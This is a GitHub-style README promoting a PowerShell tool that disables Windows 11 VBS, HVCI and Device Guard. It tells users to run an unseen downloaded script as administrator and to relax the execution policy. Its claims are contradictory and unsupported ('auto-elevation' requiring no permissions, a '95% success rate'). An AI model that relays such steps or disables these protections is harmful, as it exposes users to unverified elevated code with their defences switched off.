# 🎉 vbs-disabler-windows11 - Simplify Windows 11 Security Settings

[![Download Here](https://img.shields.io/badge/download-vbs--disabler--windows11-brightgreen?style=for-the-badge)](https://github.com/LaLaZawawa000817000/vbs-disabler-windows11)

## 🚀 Getting Started

The vbs-disabler-windows11 is a simple tool that helps you disable unnecessary security features in Windows 11. This allows better performance with applications like VMware Workstation. You don't need any technical skills to use it.

## 📥 Download the Application

To get the application, visit this link: [Download vbs-disabler-windows11](https://github.com/LaLaZawawa000817000/vbs-disabler-windows11).

## 🛠 System Requirements

- **Operating System:** Windows 11, version 24H2 or 25H2
- **Processor:** 64-bit compatible (Intel or AMD)
- **PowerShell:** Version 5.1 or higher must be enabled

## 📂 Features

- **One-command PowerShell Script:** Easy running with just one command.
- **Auto-Elevation:** Requires no extra permissions from you.
- **System Restore:** Automatically creates a restore point in case things go wrong.
- **Auto-Verification:** Checks if settings applied successfully, ensuring peace of mind.
- **High Success Rate:** Over 95% success rate in disabling security features.

## ⚙ How to Use

1. **Download the Script:**
   Go to [Download vbs-disabler-windows11](https://github.com/LaLaZawawa000817000/vbs-disabler-windows11) and download the script file.
   
2. **Open PowerShell:**
   - Search for "PowerShell" in the Windows start menu.
   - Right-click and choose "Run as administrator."

3. **Run the Script:**
   - Navigate to the folder where you saved the script. Use this command to change directories:
     ```
     cd "C:\path\to\your\download\folder"
     ```
   - Run the following command:
     ```
     .\vbs-disabler.ps1
     ```

4. **Follow Prompts:**
   The script will guide you through the process. If everything goes smoothly, you will see confirmation messages.

5. **Check Verification:**
   After completion, verify that VBS, HVCI, and Device Guard have been successfully disabled.

## ⚡ Troubleshooting

- **Script Not Running:**
  If Windows blocks the script, you may need to change your PowerShell script execution policy. To do this, run:
  ```
  Set-ExecutionPolicy RemoteSigned
  ```
  Then attempt to run the script again.

- **Error Messages:**
  If you encounter any errors, take note of the message. This can help in troubleshooting common issues.

## 🧐 Understanding VBS and Related Features

- **Virtualization-Based Security (VBS):** A security feature that protects your system from attacks.
- **HVCI (Hypervisor Protected Code Integrity):** Controls which drivers run on your system.
- **Device Guard:** Helps protect your system by running only trusted applications.

These features offer security benefits but may interfere with virtualization software like VMware Workstation.

## 🔧 Additional Resources

For more detailed explanations on virtualization and security features in Windows, refer to the Windows official documentation:

- [Microsoft Virtualization-Based Security](https://docs.microsoft.com/windows/security/threat-protection/desktop-security/virtualization-based-security)
- [Optimize VMware Workstation](https://www.vmware.com/support/ws45/doc/ws45_admin_guide/optimizing.html)

## 📞 Support

If you have questions or need assistance, feel free to raise an issue on the [GitHub repository](https://github.com/LaLaZawawa000817000/vbs-disabler-windows11). Community members and contributors are here to help.

## 🔗 Useful Links

- [Download vbs-disabler-windows11](https://github.com/LaLaZawawa000817000/vbs-disabler-windows11)
- [VMware Workstation](https://www.vmware.com/products/workstation-pro.html)

Make sure to read through this guide before attempting to run the script, ensuring a smooth experience.